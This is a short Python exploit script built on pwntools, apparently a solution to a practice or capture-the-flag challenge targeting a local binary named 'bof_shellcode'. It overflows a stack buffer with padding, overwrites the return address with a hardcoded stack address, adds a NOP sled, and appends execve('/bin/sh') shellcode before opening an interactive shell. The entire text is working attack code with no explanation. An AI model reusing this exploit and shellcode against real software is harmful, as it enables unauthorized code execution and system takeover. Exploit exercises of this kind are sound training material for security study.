from pwn import *

p = process("pwn2/bof_shellcode")
addr = 0x7fffffffe6a8

shcode = "48 31 f6 48 31 d2 52 48 b8 2f 62 69 6e 2f 2f 73  68 50 48 31 c0 48 89 e7 b0 3b 0f 05"
shcode = shcode.replace(' ', '')

mes = "a" * 0x28
mes += p64(addr + 256)
mes += "\x90" * 1000
mes += unhex(shcode)

p.sendline(mes)

p.interactive()
